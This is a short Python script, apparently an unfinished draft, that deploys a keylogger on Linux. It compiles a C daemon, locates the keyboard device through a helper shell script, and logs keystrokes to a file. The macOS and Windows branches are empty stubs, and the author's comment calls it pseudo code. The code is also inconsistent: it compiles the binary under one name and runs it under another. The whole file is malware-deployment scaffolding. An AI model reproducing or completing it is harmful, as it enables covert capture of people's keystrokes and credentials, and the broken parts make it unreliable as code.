import os
import subprocess
import platform
import sys

def deploy_keylogger():
    system = platform.system().lower()

    if system == "linux":
        subprocess.run(["gcc", "keylog_daemon.c", "-o", "keylog"], check=True)
        # i have not written daemon yet tho but just the writing this py code as a 
        # pseudo code or something like that just to understand how it will be deployed
        subprocess.run(["./find_kbd.sh"])
        target_kbd = open("/tmp/target_kbd").read().strip()

        subprocess.run(["./keylog_daemon", target_kbd, "output.log"])

    elif system == "darwin":
        print("macos")
        pass
    elif system == "windows":
        print("windows")
        pass
if __name__ == "__main__":
    deploy_keylogger()